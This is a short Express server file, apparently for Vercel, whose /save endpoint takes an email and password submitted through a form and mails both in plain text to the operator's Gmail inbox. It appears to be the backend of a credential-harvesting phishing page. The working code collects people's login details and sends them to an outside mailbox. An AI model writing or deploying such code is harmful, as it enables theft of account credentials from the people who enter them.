const express = require("express");
const path = require("path");
const nodemailer = require("nodemailer");

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve ONLY public files
app.use(express.static(path.join(__dirname, "public")));

// POST: send submission to Gmail instead of writing to file
app.post("/save", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ message: "Missing fields" });
  }

  const entry = {
    email,
    password, // as in original
    timestamp: new Date().toISOString()
  };

  try {
    // Configure Nodemailer
    const transporter = nodemailer.createTransport({
      service: "gmail", // or your SMTP provider
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS // Gmail app password if 2FA enabled
      }
    });

    // Send the actual entry to Gmail
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: "New Submission Entry",
      text: JSON.stringify(entry, null, 2) // full entry in email body
    });

    res.json({ message: "Submission sent to email" });

  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).json({ message: "Error sending submission" });
  }
});

// GET: return submissions (dashboard still works, empty array on Vercel)
app.get("/data", (req, res) => {
  res.json([]); // no persistent storage in serverless
});

// Export app for Vercel
module.exports = app;